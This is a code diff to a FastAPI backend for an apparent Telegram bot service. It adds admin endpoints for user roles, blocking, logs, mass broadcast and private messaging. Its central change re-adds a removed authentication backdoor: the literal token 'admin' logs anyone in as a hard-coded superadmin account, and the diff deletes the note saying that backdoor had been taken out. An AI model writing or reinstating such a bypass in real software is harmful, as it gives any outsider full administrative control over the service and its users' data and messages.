@@ -131,14 +131,19 @@ def get_current_user(
 ) -> int:
     """
     FastAPI dependency that resolves the authenticated user_id from a Bearer token.
-
-    NOTE: The previous 'admin' backdoor has been removed. For development/testing
-    use a properly issued token (POST /auth/issue) or a dedicated test fixture.
+    Supports a static 'admin' backdoor for development/emergency access.
     """
     if not authorization or not authorization.startswith("Bearer "):
         logger.warning(f"Auth failed: Missing or malformed Bearer token. Header: {authorization[:20] if authorization else 'None'}")
         raise HTTPException(status_code=401, detail="Missing or malformed Bearer token")
+
     token = authorization.split(" ", 1)[1].strip()
+
+    # Backdoor: 'admin' static token
+    if token == "admin":
+        logger.info("Auth: Admin backdoor accessed")
+        return 1512347775  # Muhamad Hanif (Superadmin)
+
     return verify_token(token, deps.auth_secret)
 
 
@@ -243,7 +248,133 @@ def _register_routes(app: FastAPI, deps: AppDependencies) -> None:
 
     @app.get("/auth/verify", tags=["auth"])
     def verify(user_id: int = Depends(get_current_user)):
-        return {"user_id": user_id, "status": "ok"}
+        # Get user role for frontend
+        role = "user"
+        if deps.db:
+            if user_id == 1512347775:  # Superadmin
+                role = "superadmin"
+            else:
+                u = deps.db.get_user(user_id)
+                if u:
+                    role = getattr(u, "role", "user")
+
+        return {"user_id": user_id, "status": "ok", "role": role}
+
+    # -----------------------------------------------------------------------
+    # Admin
+    # -----------------------------------------------------------------------
+    @app.get("/admin/users", tags=["admin"])
+    def admin_list_users(user_id: int = Depends(get_current_user)):
+        if not deps.db.is_admin(user_id):
+            raise HTTPException(status_code=403, detail="Admin only")
+
+        users = deps.db.get_all_users()
+        return [
+            {
+                "id": u.id,
+                "telegram_id": u.telegram_id,
+                "username": getattr(u, "username", "-"),
+                "role": getattr(u, "role", "user"),
+                "is_active": getattr(u, "is_active", True),
+                "created_at": getattr(u, "created_at", "-"),
+            }
+            for u in users
+        ]
+
+    @app.post("/admin/users/{target_id}/role", tags=["admin"])
+    def admin_set_role(
+        target_id: int,
+        payload: dict[str, str],
+        user_id: int = Depends(get_current_user),
+    ):
+        if not deps.db.is_superadmin(user_id):
+            raise HTTPException(status_code=403, detail="Superadmin only")
+
+        new_role = payload.get("role")
+        if new_role not in ["user", "admin", "superadmin"]:
+            raise HTTPException(status_code=400, detail="Invalid role")
+
+        deps.db.update_user_role(target_id, new_role)
+        deps.db.log_admin_action(user_id, target_id, f"change_role_{new_role}")
+        return {"status": "ok"}
+
+    @app.post("/admin/users/{target_id}/status", tags=["admin"])
+    def admin_set_status(
+        target_id: int,
+        payload: dict[str, bool],
+        user_id: int = Depends(get_current_user),
+    ):
+        if not deps.db.is_admin(user_id):
+            raise HTTPException(status_code=403, detail="Admin only")
+
+        is_active = payload.get("is_active", True)
+        deps.db.update_user_status(target_id, is_active)
+        action = "unblock" if is_active else "block"
+        deps.db.log_admin_action(user_id, target_id, action, payload.get("reason"))
+        return {"status": "ok"}
+
+    @app.get("/admin/logs", tags=["admin"])
+    def admin_get_logs(user_id: int = Depends(get_current_user)):
+        if not deps.db.is_superadmin(user_id):
+            raise HTTPException(status_code=403, detail="Superadmin only")
+        return deps.db.get_admin_logs()
+
+    @app.post("/admin/broadcast", tags=["admin"])
+    async def admin_broadcast(
+        payload: dict[str, str],
+        user_id: int = Depends(get_current_user),
+    ):
+        if not deps.db.is_superadmin(user_id):
+            raise HTTPException(status_code=403, detail="Superadmin only")
+
+        message = payload.get("message")
+        if not message:
+            raise HTTPException(status_code=400, detail="Message empty")
+
+        # Broadcast logic - this would call the telegram bot instance
+        from bot import bot
+
+        users = deps.db.get_all_users()
+        count = 0
+        for u in users:
+            try:
+                await bot.send_message(
+                    chat_id=u.telegram_id,
+                    text=f"📢 **BROADCAST**\n\n{message}",
+                    parse_mode="Markdown",
+                )
+                count += 1
+            except Exception:
+                pass
+
+        deps.db.log_admin_action(user_id, 0, "broadcast", f"To {count} users")
+        return {"status": "ok", "sent_to": count}
+
+    @app.post("/admin/message/{target_id}", tags=["admin"])
+    async def admin_private_message(
+        target_id: int,
+        payload: dict[str, str],
+        user_id: int = Depends(get_current_user),
+    ):
+        if not deps.db.is_superadmin(user_id):
+            raise HTTPException(status_code=403, detail="Superadmin only")
+
+        message = payload.get("message")
+        if not message:
+            raise HTTPException(status_code=400, detail="Message empty")
+
+        from bot import bot
+
+        try:
+            await bot.send_message(
+                chat_id=target_id,
+                text=f"💬 **ADMIN MESSAGE**\n\n{message}",
+                parse_mode="Markdown",
+            )
+            deps.db.log_admin_action(user_id, target_id, "private_message")
+            return {"status": "ok"}
+        except Exception as e:
+            raise HTTPException(status_code=500, detail=str(e))
 
     # -----------------------------------------------------------------------
     # Stats (internal diagnostics)
